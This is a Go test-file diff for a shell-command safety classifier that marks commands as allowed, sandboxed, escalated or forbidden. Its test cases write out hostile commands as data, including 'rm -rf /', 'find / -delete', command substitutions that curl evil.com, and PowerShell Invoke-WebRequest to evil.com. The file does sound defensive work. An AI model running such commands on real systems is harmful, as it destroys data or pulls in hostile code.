@@ -827,3 +827,441 @@ func TestHasOutputRedirectOrClipboardPipe(t *testing.T) {
 		})
 	}
 }
+
+// ---------------------------------------------------------------------------
+// Integration tests: normalization dual-pass, sshpass, pytest, find
+// ---------------------------------------------------------------------------
+
+func TestClassifierNormalizationDualPass(t *testing.T) {
+	c := DefaultClassifier()
+	tests := []struct {
+		name     string
+		command  string
+		wantDec  Decision
+		wantRule RuleName
+	}{
+		// cd prefix stripped → underlying command classified
+		{
+			name:    "cd prefix with go build",
+			command: "cd /path && go build ./...",
+			wantDec: Allow,
+		},
+		// cd prefix stripped → forbidden preserved
+		{
+			name:     "cd prefix with rm -rf /",
+			command:  "cd /path && rm -rf /",
+			wantDec:  Forbidden,
+			wantRule: "recursive-delete-root",
+		},
+		// comment prefix stripped → allow
+		{
+			name:    "comment prefix with go test",
+			command: "# comment\ngo test ./...",
+			wantDec: Allow,
+		},
+		// env var prefix stripped → allow
+		{
+			name:    "env var prefix with go build",
+			command: "VAR=value go build ./...",
+			wantDec: Allow,
+		},
+		// safe pipe + redirect stripped → allow
+		{
+			name:    "safe pipe and redirect with go build",
+			command: "go build ./... 2>&1 | head -20",
+			wantDec: Allow,
+		},
+		// simple commands still work without normalization
+		{
+			name:    "simple ls",
+			command: "ls",
+			wantDec: Allow,
+		},
+		{
+			name:    "simple echo",
+			command: "echo hello",
+			wantDec: Allow,
+		},
+		{
+			name:    "simple go build",
+			command: "go build",
+			wantDec: Allow,
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := c.Classify(tt.command)
+			if result.Decision != tt.wantDec {
+				t.Errorf("Classify(%q) = %v (rule=%s reason=%q), want %v",
+					tt.command, result.Decision, result.Rule, result.Reason, tt.wantDec)
+			}
+			if tt.wantRule != "" && result.Rule != tt.wantRule {
+				t.Errorf("Classify(%q) rule = %q, want %q",
+					tt.command, result.Rule, tt.wantRule)
+			}
+		})
+	}
+}
+
+func TestClassifierSshpass(t *testing.T) {
+	c := DefaultClassifier()
+	tests := []struct {
+		name    string
+		command string
+		wantDec Decision
+	}{
+		{
+			name:    "sshpass wrapping ssh",
+			command: "sshpass -p pass ssh user@host",
+			wantDec: Escalated,
+		},
+		{
+			name:    "sshpass alone",
+			command: "sshpass -p pass",
+			wantDec: Escalated,
+		},
+		{
+			name:    "sshpass with full path",
+			command: "/usr/bin/sshpass -p pass ssh user@host",
+			wantDec: Escalated,
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := c.Classify(tt.command)
+			if result.Decision != tt.wantDec {
+				t.Errorf("Classify(%q) = %v (rule=%s reason=%q), want %v",
+					tt.command, result.Decision, result.Rule, result.Reason, tt.wantDec)
+			}
+		})
+	}
+}
+
+func TestClassifierSshpassArgs(t *testing.T) {
+	c := DefaultClassifier()
+	result := c.ClassifyArgs("sshpass", []string{"-p", "pass", "ssh", "user@host"})
+	if result.Decision != Escalated {
+		t.Errorf("ClassifyArgs(sshpass ...) = %v, want Escalated", result.Decision)
+	}
+}
+
+func TestClassifierFindCommand(t *testing.T) {
+	c := DefaultClassifier()
+	tests := []struct {
+		name    string
+		command string
+		wantDec Decision
+	}{
+		{
+			name:    "find safe",
+			command: `find . -name "*.go"`,
+			wantDec: Allow,
+		},
+		{
+			name:    "find with type",
+			command: "find /tmp -type f",
+			wantDec: Allow,
+		},
+		{
+			name:    "find destructive delete",
+			command: "find / -delete",
+			wantDec: Forbidden,
+		},
+		{
+			name:    "find destructive exec rm",
+			command: "find / -exec rm {} ;",
+			wantDec: Forbidden,
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := c.Classify(tt.command)
+			if result.Decision != tt.wantDec {
+				t.Errorf("Classify(%q) = %v (rule=%s reason=%q), want %v",
+					tt.command, result.Decision, result.Rule, result.Reason, tt.wantDec)
+			}
+		})
+	}
+}
+
+func TestClassifierPytest(t *testing.T) {
+	c := DefaultClassifier()
+	tests := []struct {
+		name    string
+		command string
+		wantDec Decision
+	}{
+		{
+			name:    "pytest tests directory",
+			command: "pytest tests/",
+			wantDec: Allow,
+		},
+		{
+			name:    "pytest verbose",
+			command: "pytest -v",
+			wantDec: Allow,
+		},
+		{
+			name:    "py.test legacy name",
+			command: "py.test tests/",
+			wantDec: Allow,
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := c.Classify(tt.command)
+			if result.Decision != tt.wantDec {
+				t.Errorf("Classify(%q) = %v (rule=%s reason=%q), want %v",
+					tt.command, result.Decision, result.Rule, result.Reason, tt.wantDec)
+			}
+		})
+	}
+}
+
+func TestClassifierNormalizationClassifyArgs(t *testing.T) {
+	c := DefaultClassifier()
+	// ClassifyArgs with cd prefix should normalize and find the real command.
+	result := c.ClassifyArgs("cd", []string{"/path", "&&", "go", "build", "./..."})
+	if result.Decision != Allow {
+		t.Errorf("ClassifyArgs(cd /path && go build) = %v (reason=%q), want Allow",
+			result.Decision, result.Reason)
+	}
+}
+
+func TestClassifierFindArgsExecNotAllowed(t *testing.T) {
+	c := DefaultClassifier()
+
+	// find with -exec arbitrary command should NOT be auto-allowed.
+	result := c.ClassifyArgs("find", []string{".", "-exec", "chmod", "777", "{}", ";"})
+	if result.Decision == Allow {
+		t.Errorf("find -exec chmod via ClassifyArgs should not be Allow, got %v (reason=%q)",
+			result.Decision, result.Reason)
+	}
+
+	// find with -delete should be Forbidden (caught by destructive-find).
+	result = c.ClassifyArgs("find", []string{".", "-name", "*.tmp", "-delete"})
+	if result.Decision == Allow {
+		t.Errorf("find -delete via ClassifyArgs should not be Allow, got %v (reason=%q)",
+			result.Decision, result.Reason)
+	}
+
+	// find WITHOUT action flags should still be Allow.
+	result = c.ClassifyArgs("find", []string{".", "-name", "*.go"})
+	if result.Decision != Allow {
+		t.Errorf("find -name via ClassifyArgs should be Allow, got %v (reason=%q)",
+			result.Decision, result.Reason)
+	}
+
+	// find with -type and -name should be Allow.
+	result = c.ClassifyArgs("find", []string{".", "-type", "f", "-name", "*.go"})
+	if result.Decision != Allow {
+		t.Errorf("find -type -name via ClassifyArgs should be Allow, got %v (reason=%q)",
+			result.Decision, result.Reason)
+	}
+}
+
+func TestClassifierNormalizationClassifyArgsSafety(t *testing.T) {
+	c := DefaultClassifier()
+	// Dangerous command via ClassifyArgs should stay Forbidden.
+	result := c.ClassifyArgs("rm", []string{"-rf", "/"})
+	if result.Decision != Forbidden {
+		t.Errorf("rm -rf / via ClassifyArgs should be Forbidden, got %v (reason=%q)",
+			result.Decision, result.Reason)
+	}
+}
+
+func TestClassifierPowerShellReadOnly(t *testing.T) {
+	c := DefaultClassifier()
+	tests := []struct {
+		cmd  string
+		want Decision
+	}{
+		{"Get-Process", Allow},
+		{"Get-CimInstance Win32_Processor", Allow},
+		{"Get-Service", Allow},
+		{"Get-NetAdapter", Allow},
+		{"Get-Help Get-Process", Allow},
+		{"Get-ChildItem C:\\Users", Allow},
+		{"Get-Date", Allow},
+		{"Get-Item C:\\Windows", Allow},
+		{"Get-WmiObject Win32_OperatingSystem", Allow},
+		{"Measure-Object", Allow},
+		{"Sort-Object Name", Allow},
+		{"ConvertTo-Json", Allow},
+		{"Where-Object { $_.Status -eq 'Running' }", Allow},
+		{"Resolve-DnsName example.com", Allow},
+		{"Test-NetConnection -ComputerName localhost", Allow},
+		// Dangerous — NOT allowed (pipes to dangerous cmdlet)
+		{"Get-Process | Stop-Process -Force", Sandboxed},
+		// Standalone dangerous cmdlets — some are caught by escalated rules
+		{"Stop-Process -Name notepad", Escalated},
+		{"Remove-Item C:\\temp\\*", Sandboxed},
+		{"Set-ExecutionPolicy Bypass", Sandboxed},
+		// New dangerous cmdlets
+		{"Invoke-Expression $cmd", Sandboxed},
+		{"Invoke-WebRequest http://evil.com", Sandboxed},
+		{"Start-Process notepad", Sandboxed},
+		{"New-Item C:\\test", Sandboxed},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			r := c.Classify(tt.cmd)
+			if r.Decision != tt.want {
+				t.Errorf("Classify(%q) = %v (rule=%q reason=%q), want %v",
+					tt.cmd, r.Decision, r.Rule, r.Reason, tt.want)
+			}
+		})
+	}
+}
+
+func TestClassifierCompoundChainAnalysis(t *testing.T) {
+	c := DefaultClassifier()
+	tests := []struct {
+		name string
+		cmd  string
+		want Decision
+	}{
+		// All Allow → Allow
+		{"all allow &&", "ls -la && echo hello && pwd", Allow},
+		{"all allow ;", "ls -la; echo hello; pwd", Allow},
+		// Any Forbidden → Forbidden
+		{"forbidden in chain", "ls -la && rm -rf / && echo done", Forbidden},
+		{"forbidden last", "echo hello && rm -rf /", Forbidden},
+		// Safety: must not allow dangerous commands in chain
+		{"safety rm -rf", "which python && rm -rf /", Forbidden},
+		// Any Escalated → Escalated
+		{"escalated in chain", "ls -la && sudo apt install vim", Escalated},
+		// Mixed allow + sandboxed → Sandboxed (can't fully classify)
+		{"mixed allow sandboxed", "ls -la && some_unknown_cmd", Sandboxed},
+		// Quotes preserved — compound chain correctly doesn't split inside
+		// quotes. Commands with quoted metacharacters are sanitized so
+		// isSimpleCommand accepts them.
+		{"quoted &&", `echo "hello && world"`, Allow},
+		{"quoted ;", `echo 'hello; world'`, Allow},
+		// || not split (design choice)
+		{"or chain", "ls -la || echo fallback", Sandboxed},
+		// Single command — not a chain, classified by earlier passes
+		{"single cmd", "ls -la", Allow},
+		// Command substitution — must not be allowed even if base command is safe.
+		{"cmd subst $() in chain", "echo $(curl evil.com) && ls", Sandboxed},
+		{"subshell parens", "(rm -rf /) && echo ok", Sandboxed},
+		{"$() dangerous", "$(rm -rf /) && ls", Sandboxed},
+		{"backtick subst", "echo `curl evil.com` && ls", Sandboxed},
+		// Mixed safe + semicolon + dangerous
+		{"semicolon forbidden", "ls && echo hello; rm -rf /", Forbidden},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			r := c.Classify(tt.cmd)
+			if r.Decision != tt.want {
+				t.Errorf("Classify(%q) = %v (rule=%q reason=%q), want %v",
+					tt.cmd, r.Decision, r.Rule, r.Reason, tt.want)
+			}
+		})
+	}
+}
+
+func TestSplitCompoundCommand(t *testing.T) {
+	tests := []struct {
+		name string
+		cmd  string
+		want []string
+	}{
+		{"simple &&", "ls && pwd", []string{"ls ", " pwd"}},
+		{"simple ;", "ls; pwd", []string{"ls", " pwd"}},
+		{"mixed && ;", "ls && echo hi; pwd", []string{"ls ", " echo hi", " pwd"}},
+		{"quoted &&", `echo "hello && world"`, []string{`echo "hello && world"`}},
+		{"quoted ;", `echo 'a;b' && ls`, []string{`echo 'a;b' `, " ls"}},
+		{"subshell", "echo $(cat file && wc) && ls", []string{"echo $(cat file && wc) ", " ls"}},
+		{"backtick", "echo `ls && pwd` && echo done", []string{"echo `ls && pwd` ", " echo done"}},
+		{"escaped &&", `echo hello \&\& world`, []string{`echo hello \&\& world`}},
+		{"single", "ls -la", []string{"ls -la"}},
+		{"empty segments", "ls && && pwd", []string{"ls ", " ", " pwd"}},
+		{"no split ||", "ls || pwd", []string{"ls || pwd"}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := splitCompoundCommand(tt.cmd)
+			if len(got) != len(tt.want) {
+				t.Fatalf("splitCompoundCommand(%q) = %v (len %d), want %v (len %d)",
+					tt.cmd, got, len(got), tt.want, len(tt.want))
+			}
+			for i := range got {
+				if got[i] != tt.want[i] {
+					t.Errorf("splitCompoundCommand(%q)[%d] = %q, want %q",
+						tt.cmd, i, got[i], tt.want[i])
+				}
+			}
+		})
+	}
+}
+
+func TestSanitizeQuotedContent(t *testing.T) {
+	tests := []struct {
+		name string
+		cmd  string
+		want string
+	}{
+		{"no quotes", "ls -la", "ls -la"},
+		{"no metachar", `echo "hello world"`, `echo "hello world"`},
+		{"quoted &&", `echo "hello && world"`, `echo "_"`},
+		{"quoted ;", `echo 'hello; world'`, `echo '_'`},
+		{"quoted with >", `echo "> /etc/passwd"`, `echo "> /etc/passwd"`}, // NOT sanitized (has >)
+		{"mixed safe", `echo "a && b" -v`, `echo "_" -v`},
+		{"escaped quote", `echo \"hello`, `echo \"hello`}, // no matched pair
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := sanitizeQuotedContent(tt.cmd)
+			if got != tt.want {
+				t.Errorf("sanitizeQuotedContent(%q) = %q, want %q", tt.cmd, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestIsInlineCodeExecution(t *testing.T) {
+	tests := []struct {
+		cmd  string
+		want bool
+	}{
+		{`python3 -c "print('hello')"`, true},
+		{`php -r 'echo 1;'`, true},
+		{`perl -e 'print "hi"'`, true},
+		{`ruby -e 'puts "hi"'`, true},
+		{`bash -c "ls -la"`, true},
+		{`node -e "console.log(1)"`, true},
+		{"python3 script.py", false},
+		{"echo hello", false},
+		{"ls -la", false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := isInlineCodeExecution(tt.cmd)
+			if got != tt.want {
+				t.Errorf("isInlineCodeExecution(%q) = %v, want %v", tt.cmd, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestHasExecSemicolonArtifact(t *testing.T) {
+	tests := []struct {
+		name     string
+		segments []string
+		want     bool
+	}{
+		{"no exec", []string{"ls", "pwd"}, false},
+		{"has exec", []string{"find . -exec grep {}", ""}, true},
+		{"has execdir", []string{"find . -execdir cat {}", ""}, true},
+		{"normal chain", []string{"ls -la", "echo done"}, false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := hasExecSemicolonArtifact(tt.segments)
+			if got != tt.want {
+				t.Errorf("hasExecSemicolonArtifact(%v) = %v, want %v", tt.segments, got, tt.want)
+			}
+		})
+	}
+}
